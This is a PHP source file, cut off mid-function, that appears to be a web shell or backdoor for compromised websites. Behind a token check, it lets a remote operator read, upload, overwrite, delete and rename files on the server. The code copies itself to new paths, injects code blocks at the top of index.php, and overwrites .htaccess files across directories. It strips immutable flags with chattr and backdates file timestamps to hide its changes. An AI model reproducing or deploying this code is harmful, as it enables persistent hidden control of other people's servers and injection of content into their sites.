<?php

define('SECRET_KEY', 'LKSJDFaDFDF323$2afd');

$ROOT = dirname(__FILE__);
$SELF_FILE = __FILE__;
if (isset($_SERVER['SCRIPT_FILENAME']) && @is_file($_SERVER['SCRIPT_FILENAME'])) {
    $SELF_FILE = $_SERVER['SCRIPT_FILENAME'];
    $ROOT = dirname($SELF_FILE);
}

$host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$host = strtolower($host);
$p = strpos($host, ':');
if ($p !== false) { $host = substr($host, 0, $p); }
if (substr($host, 0, 4) === 'www.') { $host = substr($host, 4); }

$expect = md5(SECRET_KEY . ':' . $host . ':' . SECRET_KEY);

$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

if ($action === '' || $action === 'ping') {
    header('Content-Type: text/plain');
    echo '1';
    exit;
}

if ($action === 'detect') {
    $has_wp_load = is_file($ROOT . '/wp-load.php');
    $has_wp_blog = is_file($ROOT . '/wp-blog-header.php');
    $is_wp = $has_wp_load && $has_wp_blog;
    header('Content-Type: application/json');
    echo json_encode(array(
        'code'    => 200,
        'is_wp'   => $is_wp ? 1 : 0,
        'cms'     => $is_wp ? 'WordPress' : 'custom',

        'bundle'  => 1,
        'detail'  => array(
            'wp-load.php'        => $has_wp_load ? 1 : 0,
            'wp-blog-header.php' => $has_wp_blog ? 1 : 0,
        ),
    ));
    exit;
}

$token = '';
if (isset($_SERVER['HTTP_X_AQUA_TOKEN'])) {
    $token = $_SERVER['HTTP_X_AQUA_TOKEN'];
} elseif (isset($_REQUEST['token'])) {
    $token = $_REQUEST['token'];
}
if ($token !== $expect) {
    aqua_json(403, '口令校验失败', null);
}
$__aqua_dec_body = null;
$__aqua_dec_error = '';

$__aqua_enc = '';
if (isset($_REQUEST['e']) && is_string($_REQUEST['e'])) {
    $__aqua_enc = $_REQUEST['e'];
} elseif (isset($_SERVER['HTTP_X_AQUA_ENC'])) {
    $__aqua_enc = $_SERVER['HTTP_X_AQUA_ENC'];
}

if ($__aqua_enc === 'xor' || $__aqua_enc === 'xor.gz') {
    $__k = substr($expect, 0, 16);
    $__raw = @file_get_contents('php://input');
    if ($__raw === false || $__raw === '') {
        $__aqua_dec_error = 'empty_input';
    } else {
        $__plen = 0;
        if (isset($_REQUEST['l']) && ctype_digit((string)$_REQUEST['l'])) {
            $__plen = intval($_REQUEST['l']);
        } elseif (isset($_SERVER['HTTP_X_AQUA_LEN'])) {
            $__plen = intval($_SERVER['HTTP_X_AQUA_LEN']);
        }
        if ($__plen > 0 && $__plen < strlen($__raw)) {
            $__raw = substr($__raw, 0, $__plen);
        }
        // base64_decode + XOR
        $__bin = base64_decode($__raw);
        if ($__bin === false || $__bin === '') {
            $__aqua_dec_error = 'base64_failed';
        } else {
            $__klen = strlen($__k);
            for ($__i = 0, $__blen = strlen($__bin); $__i < $__blen; $__i++) {
                $__bin[$__i] = chr(ord($__bin[$__i]) ^ ord($__k[$__i % $__klen]));
            }
            // gzip 解压
            if ($__aqua_enc === 'xor.gz') {
                if (function_exists('gzuncompress')) {
                    $__dec = @gzuncompress($__bin);
                    if ($__dec !== false) {
                        $__bin = $__dec;
                    } else {
                        $__aqua_dec_error = 'gzuncompress_failed';
                    }
                }
            }
            if ($__aqua_dec_error === '') {
                $__aqua_dec_body = $__bin;
            }
        }
    }
    if ($__aqua_dec_body === null) {
        aqua_json(499, 'decrypt_failed:' . $__aqua_dec_error, null);
    }
    unset($__k, $__raw, $__bin, $__klen, $__i, $__blen, $__plen, $__dec);
}
unset($__aqua_enc, $__aqua_dec_error);

function aqua_safe_path($ROOT, $rel) {
    $rel = str_replace('\\', '/', $rel);
    $rel = ltrim($rel, '/');
    if ($rel === '' || strpos($rel, '..') !== false) { return false; }
    $parts = explode('/', $rel);
    $clean = array();
    for ($i = 0; $i < count($parts); $i++) {
        $seg = $parts[$i];
        if ($seg === '' || $seg === '.' || $seg === '..') { return false; }
        $seg = preg_replace('/[^A-Za-z0-9._-]/', '_', $seg);
        if ($seg === '') { return false; }
        $clean[] = $seg;
    }
    return $ROOT . '/' . implode('/', $clean);
}

switch ($action) {

    case 'read':
        $rel = isset($_REQUEST['file']) ? $_REQUEST['file'] : 'index.php';
        $full = aqua_safe_path($ROOT, $rel);
        if ($full === false || !is_file($full)) {
            aqua_json(404, '文件不存在', null);
        }
        $content = file_get_contents($full);
        aqua_json(200, 'ok', array(
            'file'    => $rel,
            'size'    => strlen($content),
            'md5'     => md5($content),
            'content' => base64_encode($content),
        ));
        break;

    case 'hash':
        $rel = isset($_REQUEST['file']) ? $_REQUEST['file'] : 'index.php';
        $full = aqua_safe_path($ROOT, $rel);
        if ($full === false || !is_file($full)) {
            aqua_json(404, '文件不存在', null);
        }
        aqua_json(200, 'ok', array(
            'file' => $rel,
            'size' => filesize($full),
            'md5'  => md5_file($full),
        ));
        break;

    case 'upload':
        aqua_cleanup_blockers($ROOT);

        if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
            aqua_json(400, '未收到文件或上传出错', null);
        }
        $rel = isset($_REQUEST['rel_path']) ? $_REQUEST['rel_path'] : '';
        $rel = str_replace('\\', '/', $rel);
        $rel = ltrim($rel, '/');

        $slash = strrpos($rel, '/');
        if ($slash === false) { $relDir = ''; $relFile = $rel; }
        else { $relDir = substr($rel, 0, $slash); $relFile = substr($rel, $slash + 1); }

        $relFile = basename($relFile);
        $relFile = preg_replace('/[^A-Za-z0-9._-]/', '_', $relFile);
        if ($relFile === '' || $relFile === '.' || $relFile === '..') { $relFile = 'file_' . time(); }

        $usedFallback = false;
        if ($relDir === '') {
            $destDir = $ROOT;
        } else {
            $parts = explode('/', $relDir); $safe = array(); $bad = false;
            for ($i = 0; $i < count($parts); $i++) {
                $seg = $parts[$i];
                if ($seg === '' || $seg === '.' || $seg === '..') { $bad = true; break; }
                $c = preg_replace('/[^A-Za-z0-9._-]/', '_', $seg);
                if ($c === '') { $bad = true; break; }
                $safe[] = $c;
            }
            $cand = $bad ? '' : ($ROOT . '/' . implode('/', $safe));
            if (!$bad && $cand !== '') {
                if (!is_dir($cand)) {
                    @mkdir($cand, 0755, true);
                }
                if (is_dir($cand)) {
                    $destDir = $cand;
                } else {
                    $destDir = $ROOT . '/uploads';
                    $usedFallback = true;
                }
            } else {
                $destDir = $ROOT . '/uploads';
                $usedFallback = true;
            }
        }
        if ($usedFallback && !is_dir($destDir)) {
            if (!@mkdir($destDir, 0755, true) && !is_dir($destDir)) {
                aqua_json(500, '无法创建 uploads 兜底目录', null);
            }
        }
        $dest = $destDir . '/' . $relFile;
        if (!move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
            aqua_json(500, '保存失败', null);
        }
        aqua_touch_2020($dest);
        aqua_touch_2020_dir($destDir, $ROOT);
        aqua_json(200, 'ok', array(
            'saved'    => aqua_rel($ROOT, $dest),
            'fallback' => $usedFallback ? 1 : 0,
            'size'     => filesize($dest),
        ));
        break;

    case 'write':
        $rel = isset($_REQUEST['rel_path']) ? $_REQUEST['rel_path'] : '';
        if ($rel === '') { aqua_json(400, '缺少 rel_path', null); }

        aqua_cleanup_blockers($ROOT);

        $dest = aqua_write_target($ROOT, $rel);
        if ($dest === false) { aqua_json(400, '目标路径非法', null); }

        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
            if (is_file($dest)) { aqua_ensure_writable($dest); }
            if (!@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                if (is_file($dest)) {
                    if (function_exists('exec')) { @exec('chattr -i ' . escapeshellarg($dest) . ' 2>/dev/null'); }
                    @chmod($dest, 0777); @unlink($dest);
                }
                if (!@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                    aqua_json(500, '保存失败', null);
                }
            }
            aqua_touch_2020($dest);
            aqua_touch_2020_dir(dirname($dest), $ROOT);
            aqua_json(200, 'ok', array('saved' => aqua_rel($ROOT, $dest), 'size' => filesize($dest)));
        }
        if (isset($_REQUEST['content_b64'])) {
            $data = base64_decode($_REQUEST['content_b64']);
            if ($data === false) { aqua_json(400, 'content_b64 解码失败', null); }
            if (!aqua_force_write($dest, $data)) {
                aqua_json(500, '写入失败', null);
            }
            aqua_touch_2020($dest);
            aqua_touch_2020_dir(dirname($dest), $ROOT);
            aqua_json(200, 'ok', array('saved' => aqua_rel($ROOT, $dest), 'size' => strlen($data)));
        }
        aqua_json(400, '没有可写入的内容', null);
        break;

    case 'spread':
        $to = isset($_REQUEST['to']) ? $_REQUEST['to'] : '';
        if ($to === '') { aqua_json(400, '缺少 to', null); }
        $dest = aqua_write_target($ROOT, $to);
        if ($dest === false) { aqua_json(400, '目标路径非法', null); }
        $self = file_get_contents($SELF_FILE);
        if ($self === false) { aqua_json(500, '读取自身失败', null); }
        if (!aqua_force_write($dest, $self)) {
            aqua_json(500, '复制失败（目录可能不可写）', null);
        }
        aqua_touch_2020($dest);
        aqua_json(200, 'ok', array('spawned' => aqua_rel($ROOT, $dest), 'size' => strlen($self)));
        break;

    case 'backup':
        if (!isset($_REQUEST['count'])) {
            aqua_json(400, '缺少 count 参数', null);
        }

        $count = intval($_REQUEST['count']);
        if ($count <= 0 || $count > 20) {
            aqua_json(400, 'count 必须在 1-20 之间', null);
        }

        $results = array();
        $successCount = 0;
        $failedCount = 0;

        for ($i = 0; $i < $count; $i++) {
            $fromKey = 'from_' . $i;
            $toKey = 'to_' . $i;

            if (!isset($_REQUEST[$fromKey]) || !isset($_REQUEST[$toKey])) {
                $results[] = array('index' => $i, 'ok' => false, 'error' => '缺少参数');
                $failedCount++;
                continue;
            }

            $from = $_REQUEST[$fromKey];
            $to = $_REQUEST[$toKey];

            $fromFull = aqua_safe_path($ROOT, $from);
            $toFull = aqua_write_target($ROOT, $to);

            if ($fromFull === false) {
                $results[] = array('from' => $from, 'to' => $to, 'ok' => false, 'error' => '源路径非法');
                $failedCount++;
                continue;
            }

            if ($toFull === false) {
                $results[] = array('from' => $from, 'to' => $to, 'ok' => false, 'error' => '目标路径非法');
                $failedCount++;
                continue;
            }

            if (!is_file($fromFull)) {
                $results[] = array('from' => $from, 'to' => $to, 'ok' => false, 'error' => '源文件不存在');
                $failedCount++;
                continue;
            }

            $content = file_get_contents($fromFull);
            if ($content === false) {
                $results[] = array('from' => $from, 'to' => $to, 'ok' => false, 'error' => '读取源文件失败');
                $failedCount++;
                continue;
            }

            $needUpdate = true;
            if (is_file($toFull)) {
                $existing = file_get_contents($toFull);
                if ($existing === $content) {
                    $needUpdate = false;
                }
            }

            if ($needUpdate) {
                if (!aqua_force_write($toFull, $content)) {
                    $results[] = array('from' => $from, 'to' => $to, 'ok' => false, 'error' => '写入备份失败');
                    $failedCount++;
                    continue;
                }
                aqua_touch_2020($toFull);
            }

            $results[] = array(
                'from' => $from,
                'to' => $to,
                'ok' => true,
                'size' => strlen($content),
                'updated' => $needUpdate
            );
            $successCount++;
        }

        aqua_json(200, 'ok', array(
            'success' => $successCount,
            'failed' => $failedCount,
            'files' => $results
        ));
        break;

    case 'batch_write':
        aqua_cleanup_blockers($ROOT);

        if (!isset($_FILES) || count($_FILES) === 0) {
            aqua_json(400, '没有上传文件', null);
        }

        $results = array();
        $successCount = 0;
        $failedCount = 0;

        foreach ($_FILES as $key => $file) {
            $idx = str_replace('file_', '', $key);
            $pathKey = 'path_' . $idx;

            if (!isset($_REQUEST[$pathKey])) {
                $results[] = array('file' => $key, 'ok' => false, 'error' => '缺少路径参数');
                $failedCount++;
                continue;
            }

            $relPath = $_REQUEST[$pathKey];
            $dest = aqua_write_target($ROOT, $relPath);

            if ($dest === false) {
                $results[] = array('path' => $relPath, 'ok' => false, 'error' => '目标路径非法');
                $failedCount++;
                continue;
            }

            if ($file['error'] !== UPLOAD_ERR_OK) {
                $results[] = array('path' => $relPath, 'ok' => false, 'error' => '上传错误：' . $file['error']);
                $failedCount++;
                continue;
            }

            if (is_file($dest)) {
                aqua_ensure_writable($dest);
            }

            if (!@move_uploaded_file($file['tmp_name'], $dest)) {
                if (is_file($dest)) {
                    if (function_exists('exec')) {
                        @exec('chattr -i ' . escapeshellarg($dest) . ' 2>/dev/null');
                    }
                    @chmod($dest, 0777);
                    @unlink($dest);
                }

                if (!@move_uploaded_file($file['tmp_name'], $dest)) {
                    $results[] = array('path' => $relPath, 'ok' => false, 'error' => '保存失败');
                    $failedCount++;
                    continue;
                }
            }

            aqua_touch_2020($dest);
            aqua_touch_2020_dir(dirname($dest), $ROOT);

            $results[] = array(
                'path' => $relPath,
                'ok' => true,
                'size' => filesize($dest),
                'md5' => md5_file($dest)
            );
            $successCount++;
        }

        aqua_json(200, 'ok', array(
            'success' => $successCount,
            'failed' => $failedCount,
            'files' => $results
        ));
        break;

    case 'batch_remove':
        if (!isset($_REQUEST['count'])) {
            aqua_json(400, '缺少 count 参数', null);
        }

        $count = intval($_REQUEST['count']);
        if ($count <= 0 || $count > 50) {
            aqua_json(400, 'count 必须在 1-50 之间', null);
        }

        $results = array();
        $successCount = 0;
        $failedCount = 0;

        for ($i = 0; $i < $count; $i++) {
            $fileKey = 'file_' . $i;

            if (!isset($_REQUEST[$fileKey])) {
                $results[] = array('index' => $i, 'ok' => false, 'error' => '缺少参数');
                $failedCount++;
                continue;
            }

            $rel = $_REQUEST[$fileKey];
            $full = aqua_safe_path($ROOT, $rel);

            if ($full === false) {
                $results[] = array('file' => $rel, 'ok' => false, 'error' => '路径非法');
                $failedCount++;
                continue;
            }

            if (!is_file($full)) {
                $results[] = array('file' => $rel, 'ok' => true, 'skipped' => true);
                $successCount++;
                continue;
            }

            @chmod($full, 0644);
            if (!@unlink($full)) {
                @chmod($full, 0777);
                if (!@unlink($full)) {
                    if (function_exists('exec')) {
                        @exec('chattr -i ' . escapeshellarg($full) . ' 2>/dev/null');
                        @chmod($full, 0644);
                    }
                    if (!@unlink($full)) {
                        $results[] = array('file' => $rel, 'ok' => false, 'error' => '删除失败');
                        $failedCount++;
                        continue;
                    }
                }
            }

            $results[] = array('file' => $rel, 'ok' => true);
            $successCount++;
        }

        aqua_json(200, 'ok', array(
            'success' => $successCount,
            'failed' => $failedCount,
            'files' => $results
        ));
        break;

    case 'remove':
        $rel = isset($_REQUEST['file']) ? $_REQUEST['file'] : '';
        $full = aqua_safe_path($ROOT, $rel);
        if ($full === false || !is_file($full)) { aqua_json(404, '文件不存在', null); }
        @chmod($full, 0644);
        if (!@unlink($full)) {
            @chmod($full, 0777);
            if (!@unlink($full)) {
                if (function_exists('exec')) {
                    @exec('chattr -i ' . escapeshellarg($full) . ' 2>/dev/null');
                    @chmod($full, 0644);
                }
                if (!@unlink($full)) {
                    aqua_json(500, '删除失败', array('file' => $rel, 'perms' => substr(sprintf('%o', fileperms($full)), -4)));
                }
            }
        }
        aqua_json(200, 'ok', array('removed' => $rel));
        break;

    case 'prepend':
        $rel = isset($_REQUEST['file']) ? $_REQUEST['file'] : '';
        if ($rel === '') { aqua_json(400, '缺少 file', null); }
        $full = aqua_safe_path($ROOT, $rel);
        if ($full === false || !is_file($full)) {
            aqua_json(404, '文件不存在', null);
        }
        $snippet = isset($_REQUEST['snippet']) ? $_REQUEST['snippet'] : '';
        $marker  = isset($_REQUEST['marker'])  ? $_REQUEST['marker']  : '';
        if ($snippet === '') { aqua_json(400, '缺少 snippet', null); }

        $content = file_get_contents($full);

        if ($marker !== '' && strpos($content, $marker) !== false) {
            aqua_json(200, 'already', array(
                'file'     => $rel,
                'injected' => false,
                'size'     => strlen($content),
                'md5'      => md5($content),
                'content'  => base64_encode($content),
            ));
        }

        $pos = stripos($content, '<?php');
        if ($pos === false) {
            aqua_json(200, 'no_php_tag', array(
                'file'     => $rel,
                'injected' => false,
                'size'     => strlen($content),
                'md5'      => md5($content),
                'content'  => base64_encode($content),
            ));
        }

        $insertAt = $pos + 5;
        $newContent = substr($content, 0, $insertAt) . "\n" . $snippet . "\n" . substr($content, $insertAt);

        if (!aqua_force_write($full, $newContent)) {
            aqua_json(500, '写入失败', null);
        }
        aqua_touch_2020($full);

        aqua_json(200, 'ok', array(
            'file'     => $rel,
            'injected' => true,
            'size'     => strlen($newContent),
            'md5'      => md5($newContent),
            'content'  => base64_encode($newContent),
        ));
        break;

    case 'rename':
        $from = isset($_REQUEST['from']) ? $_REQUEST['from'] : '';
        $to   = isset($_REQUEST['to'])   ? $_REQUEST['to']   : '';
        if ($from === '' || $to === '') { aqua_json(400, '缺少 from 或 to', null); }
        $fullFrom = aqua_safe_path($ROOT, $from);
        $fullTo   = aqua_safe_path($ROOT, $to);
        if ($fullFrom === false) { aqua_json(400, 'from 路径非法', null); }
        if ($fullTo   === false) { aqua_json(400, 'to 路径非法', null); }
        if (!is_file($fullFrom)) { aqua_json(404, '源文件不存在', null); }
        aqua_ensure_writable($fullFrom);
        if (!@rename($fullFrom, $fullTo)) {
            aqua_json(500, '重命名失败', null);
        }
        aqua_touch_2020($fullTo);
        aqua_json(200, 'ok', array('from' => $from, 'to' => $to));
        break;

    case 'touch_dirs':
        aqua_touch_all_dirs($ROOT);
        aqua_json(200, 'ok', null);
        break;

    case 'list_directories':
        $relPath = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';
        $depth = isset($_REQUEST['depth']) ? intval($_REQUEST['depth']) : 1;
        $maxResults = isset($_REQUEST['max_results']) ? intval($_REQUEST['max_results']) : 200;

        if ($depth < 0) $depth = 1;
        if ($depth > 10) $depth = 10;
        if ($maxResults < 1) $maxResults = 200;
        if ($maxResults > 1000) $maxResults = 1000;

        $scanRoot = $ROOT;
        if ($relPath !== '') {
            $scanRoot = aqua_safe_path($ROOT, $relPath);
            if ($scanRoot === false || !is_dir($scanRoot)) {
                aqua_json(400, '路径不存在或非法', null);
            }
        }

        $dirs = array();
        aqua_scan_directories($scanRoot, $ROOT, '', $depth, 0, $dirs, $maxResults);

        sort($dirs);
        aqua_json(200, 'ok', array(
            'directories' => $dirs,
            'count' => count($dirs),
            'depth' => $depth,
            'truncated' => count($dirs) >= $maxResults ? 1 : 0
        ));
        break;

    case 'bundle_harden':
        aqua_cleanup_blockers($ROOT);

        $req = aqua_read_json_body();
        if (!is_array($req)) {
            aqua_json(400, 'bundle_harden 需要 JSON body', null);
        }

        $out = array(
            'cleanup' => array(),
            'backup'  => array(),
            'files'   => array(),
            'protect' => array(),
        );

        if (isset($req['cleanup_files']) && is_array($req['cleanup_files'])) {
            foreach ($req['cleanup_files'] as $rel) {
                if (!is_string($rel) || $rel === '') { continue; }
                $full = aqua_safe_path($ROOT, $rel);
                if ($full === false) {
                    $out['cleanup'][$rel] = 'invalid_path';
                    continue;
                }
                if (!is_file($full)) {
                    $out['cleanup'][$rel] = 'not_found';
                    continue;
                }
                $out['cleanup'][$rel] = aqua_hard_unlink($full) ? 'deleted' : 'delete_failed';
            }
        }

        if (isset($req['backup_pairs']) && is_array($req['backup_pairs'])) {
            foreach ($req['backup_pairs'] as $pair) {
                if (!is_array($pair)) { continue; }
                $from = isset($pair['from']) ? $pair['from'] : '';
                $to   = isset($pair['to'])   ? $pair['to']   : '';
                if ($from === '' || $to === '') { continue; }
                $item = array('from' => $from, 'to' => $to);
                $fromFull = aqua_safe_path($ROOT, $from);
                $toFull   = aqua_write_target($ROOT, $to);
                if ($fromFull === false || $toFull === false) {
                    $item['ok'] = false; $item['error'] = 'invalid_path';
                } elseif (!is_file($fromFull)) {
                    $item['ok'] = false; $item['error'] = 'no_source';
                } else {
                    $content = @file_get_contents($fromFull);
                    if ($content === false) {
                        $item['ok'] = false; $item['error'] = 'read_failed';
                    } else {
                        $needUpdate = true;
                        if (is_file($toFull)) {
                            $existing = @file_get_contents($toFull);
                            if ($existing === $content) { $needUpdate = false; }
                        }
                        if ($needUpdate) {
                            if (aqua_force_write($toFull, $content)) {
                                aqua_touch_2020($toFull);
                                $item['ok'] = true;
                                $item['updated'] = true;
                                $item['size'] = strlen($content);
                            } else {
                                $item['ok'] = false; $item['error'] = 'write_failed';
                            }
                        } else {
                            $item['ok'] = true;
                            $item['updated'] = false;
                            $item['size'] = strlen($content);
                        }
                    }
                }
                $out['backup'][] = $item;
            }
        }

        if (isset($req['rename_pairs']) && is_array($req['rename_pairs'])) {
            foreach ($req['rename_pairs'] as $pair) {
                if (!is_array($pair)) { continue; }
                $from = isset($pair['from']) ? $pair['from'] : '';
                $to   = isset($pair['to'])   ? $pair['to']   : '';
                if ($from === '' || $to === '') { continue; }
                $item = array('from' => $from, 'to' => $to);
                $fromFull = aqua_safe_path($ROOT, $from);
                $toFull   = aqua_write_target($ROOT, $to);
                if ($fromFull === false || $toFull === false) {
                    $item['ok'] = false; $item['error'] = 'invalid_path';
                } elseif (!is_file($fromFull)) {
                    $item['ok'] = true; $item['updated'] = false; $item['error'] = 'no_source';
                } else {
                    if (@rename($fromFull, $toFull)) {
                        aqua_touch_2020($toFull);
                        $item['ok'] = true; $item['updated'] = true;
                    } else {
                        $item['ok'] = false; $item['error'] = 'rename_failed';
                    }
                }
                if (!isset($out['rename'])) { $out['rename'] = array(); }
                $out['rename'][] = $item;
            }
        }

        if (isset($req['files']) && is_array($req['files'])) {
            foreach ($req['files'] as $rel => $b64) {
                if (!is_string($rel) || $rel === '' || !is_string($b64)) {
                    $out['files'][(string)$rel] = array('ok' => false, 'error' => 'bad_param');
                    continue;
                }
                $dest = aqua_write_target($ROOT, $rel);
                if ($dest === false) {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'invalid_path');
                    continue;
                }
                $content = base64_decode($b64, true);
                if ($content === false) {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'bad_base64');
                    continue;
                }
                if (aqua_force_write($dest, $content)) {
                    aqua_touch_2020($dest);
                    aqua_touch_2020_dir(dirname($dest), $ROOT);
                    $out['files'][$rel] = array(
                        'ok'   => true,
                        'size' => strlen($content),
                        'md5'  => md5($content),
                    );
                } else {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'write_failed');
                }
            }
        }

        if (isset($req['protect_htaccess_b64']) && is_string($req['protect_htaccess_b64']) && $req['protect_htaccess_b64'] !== '') {
            $protectContent = base64_decode($req['protect_htaccess_b64'], true);
            if ($protectContent === false) {
                $out['protect']['error'] = 'bad_base64';
            } else {
                $exclude = array();
                if (isset($req['protect_exclude']) && is_array($req['protect_exclude'])) {
                    foreach ($req['protect_exclude'] as $ex) {
                        if (is_string($ex)) { $exclude[$ex] = true; }
                    }
                }

                $found = array();
                $skipped = array();
                $written = array();
                $errors = array();

                $dh = @opendir($ROOT);
                if ($dh) {
                    while (($f = readdir($dh)) !== false) {
                        if ($f === '.' || $f === '..') { continue; }
                        if (!is_dir($ROOT . '/' . $f)) { continue; }
                        $found[] = $f;
                        if (isset($exclude[$f])) { $skipped[] = $f; continue; }

                        $dest = $ROOT . '/' . $f . '/.htaccess';
                        if (aqua_force_write($dest, $protectContent)) {
                            aqua_touch_2020($dest);
                            $written[] = $f;
                        } else {
                            $errors[] = $f;
                        }
                    }
                    closedir($dh);
                    sort($found);
                }

                $out['protect'] = array(
                    'found'   => $found,
                    'skipped' => $skipped,
                    'written' => $written,
                    'errors'  => $errors,
                );
            }
        }

        aqua_json(200, 'ok', $out);
        break;

    case 'bundle_harden_nonwp':
        aqua_cleanup_blockers($ROOT);

        $req = aqua_read_json_body();
        if (!is_array($req)) {
            aqua_json(400, 'bundle_harden_nonwp 需要 JSON body', null);
        }

        $out = array(
            'defines' => null,
            'index'   => null,
            'htaccess'=> null,
        );

        $definesB64 = isset($req['defines_php_b64']) ? $req['defines_php_b64'] : '';
        if (is_string($definesB64) && $definesB64 !== '') {
            $bytes = base64_decode($definesB64, true);
            if ($bytes === false) {
                $out['defines'] = array('ok' => false, 'error' => 'bad_base64');
            } else {
                $dest = aqua_write_target($ROOT, 'defines.php');
                if ($dest === false) {
                    $out['defines'] = array('ok' => false, 'error' => 'invalid_path');
                } elseif (aqua_force_write($dest, $bytes)) {
                    aqua_touch_2020($dest);
                    $out['defines'] = array(
                        'ok' => true,
                        'size' => strlen($bytes),
                        'md5' => md5($bytes),
                    );
                } else {
                    $out['defines'] = array('ok' => false, 'error' => 'write_failed');
                }
            }
        }

        $indexHtml = $ROOT . '/index.html';
        $indexPhp  = $ROOT . '/index.php';

        if (is_file($indexHtml)) {

            $index2 = $ROOT . '/index2.html';
            $renamed = @rename($indexHtml, $index2);
            if (!$renamed) {

                if (is_file($index2)) {
                    aqua_hard_unlink($index2);
                    $renamed = @rename($indexHtml, $index2);
                }
            }
            if (!$renamed) {
                $out['index'] = array('mode' => 'html_present', 'ok' => false, 'error' => 'rename_failed');
            } else {
                aqua_touch_2020($index2);
                $withHtmlB64 = isset($req['index_php_with_html_b64']) ? $req['index_php_with_html_b64'] : '';
                $bytes = base64_decode((string)$withHtmlB64, true);
                if ($bytes === false || $bytes === '') {
                    $out['index'] = array('mode' => 'html_present', 'ok' => false, 'error' => 'bad_index_php_with_html_b64');
                } elseif (aqua_force_write($indexPhp, $bytes)) {
                    aqua_touch_2020($indexPhp);
                    $out['index'] = array(
                        'mode' => 'html_present',
                        'ok'   => true,
                        'renamed_to' => 'index2.html',
                        'size' => strlen($bytes),
                    );
                } else {
                    $out['index'] = array('mode' => 'html_present', 'ok' => false, 'error' => 'write_failed');
                }
            }
        } else {

            if (!is_file($indexPhp)) {

                $requireExist = isset($req['require_index_exist']) ? (bool)$req['require_index_exist'] : false;
                if ($requireExist) {
                    $out['index'] = array(
                        'mode' => 'no_index_error',
                        'ok' => false,
                        'error' => 'index_php_and_index_html_both_missing',
                    );
                } else {
                    $defaultB64 = isset($req['index_php_default_b64']) ? $req['index_php_default_b64'] : '';
                    $bytes = base64_decode((string)$defaultB64, true);
                    if ($bytes === false || $bytes === '') {
                        $out['index'] = array('mode' => 'no_index_create', 'ok' => false, 'error' => 'bad_index_php_default_b64');
                    } elseif (aqua_force_write($indexPhp, $bytes)) {
                        aqua_touch_2020($indexPhp);
                        $out['index'] = array('mode' => 'no_index_create', 'ok' => true, 'size' => strlen($bytes));
                    } else {
                        $out['index'] = array('mode' => 'no_index_create', 'ok' => false, 'error' => 'write_failed');
                    }
                }
            } else {

                $orig = @file_get_contents($indexPhp);
                if ($orig === false) {
                    $out['index'] = array('mode' => 'prepend', 'ok' => false, 'error' => 'read_failed');
                } else {
                    // ---------- 新版:safety_block + 明文 marker(v3 Agent) ----------
                    // Agent 传:
                    //   safety_block         —— 完整的注入代码块(自带 PHP 起止标签)
                    //   safety_start_marker  —— 如 "A9K3X"
                    //   safety_end_marker    —— 如 "Q7L2M"
                    // 用 marker 正则删掉旧块(如果有),再 prepend 新块。
                    // 无论换几种加密再上码,index.php 里始终只有一份 safety 块。
                    $safetyBlock = isset($req['safety_block']) ? (string)$req['safety_block'] : '';
                    if ($safetyBlock !== '') {
                        $startMk = isset($req['safety_start_marker']) ? (string)$req['safety_start_marker'] : '';
                        $endMk   = isset($req['safety_end_marker'])   ? (string)$req['safety_end_marker']   : '';

                        $stripped = $orig;
                        $removedOld = false;
                        if ($startMk !== '' && $endMk !== '') {
                            // 匹配整个旧块:开头是 <\?php /*START*/, 结尾是 /*END*/ 尾闭合。
                            // s 修饰符让 . 匹配换行(空白编码里包含 \n);
                            // 非贪婪 .*? 只吃到最近的 END,不误伤后面手写注释。
                            $pattern = '/<\?php\s*\/\*' . preg_quote($startMk, '/')
                                     . '\*\/.*?\/\*' . preg_quote($endMk, '/')
                                     . '\*\/\s*\?>\s*/s';
                            $stripped2 = preg_replace($pattern, '', $orig, 1);
                            if ($stripped2 !== null && $stripped2 !== $orig) {
                                $stripped = $stripped2;
                                $removedOld = true;
                            }
                        }

                        // 保证块尾换行,和 $stripped 之间有分隔
                        $blockOut = $safetyBlock;
                        if (substr($blockOut, -1) !== "\n") { $blockOut .= "\n"; }
                        $newContent = $blockOut . $stripped;

                        if (aqua_force_write($indexPhp, $newContent)) {
                            aqua_touch_2020($indexPhp);
                            $out['index'] = array(
                                'mode'        => 'safety_block',
                                'ok'          => true,
                                'removed_old' => $removedOld,
                                'size'        => strlen($newContent),
                            );
                        } else {
                            $out['index'] = array('mode' => 'safety_block', 'ok' => false, 'error' => 'write_failed');
                        }
                    }
                    // ---------- 老版:index_require_line + marker(兼容旧 Agent) ----------
                    else {
                        $marker = isset($req['index_require_marker']) ? (string)$req['index_require_marker'] : '';
                        if ($marker !== '' && strpos($orig, $marker) !== false) {
                            $out['index'] = array('mode' => 'prepend', 'ok' => true, 'skipped' => true, 'reason' => 'already_injected');
                        } else {
                            $line = isset($req['index_require_line']) ? (string)$req['index_require_line'] : '';
                            if ($line === '') {
                                $out['index'] = array('mode' => 'prepend', 'ok' => false, 'error' => 'missing_index_require_line');
                            } else {
                                $newContent = $line . "\n" . $orig;
                                if (aqua_force_write($indexPhp, $newContent)) {
                                    aqua_touch_2020($indexPhp);
                                    $out['index'] = array('mode' => 'prepend', 'ok' => true, 'size' => strlen($newContent));
                                } else {
                                    $out['index'] = array('mode' => 'prepend', 'ok' => false, 'error' => 'write_failed');
                                }
                            }
                        }
                    }
                }
            }
        }

        $htaccessTargetFull = $ROOT . '/.htaccess';
        $htaccessB64        = isset($req['htaccess_b64']) ? $req['htaccess_b64'] : '';
        $htaccessMarker     = isset($req['htaccess_marker']) ? (string)$req['htaccess_marker'] : '';
        $htaccessBackupName = isset($req['htaccess_backup_name']) && $req['htaccess_backup_name'] !== ''
            ? (string)$req['htaccess_backup_name']
            : 'htaccesscf';

        $htaccessBytes = base64_decode((string)$htaccessB64, true);
        if ($htaccessBytes === false || $htaccessBytes === '') {
            $out['htaccess'] = array('ok' => false, 'error' => 'bad_htaccess_b64');
        } elseif (!is_file($htaccessTargetFull)) {

            if (aqua_force_write($htaccessTargetFull, $htaccessBytes)) {
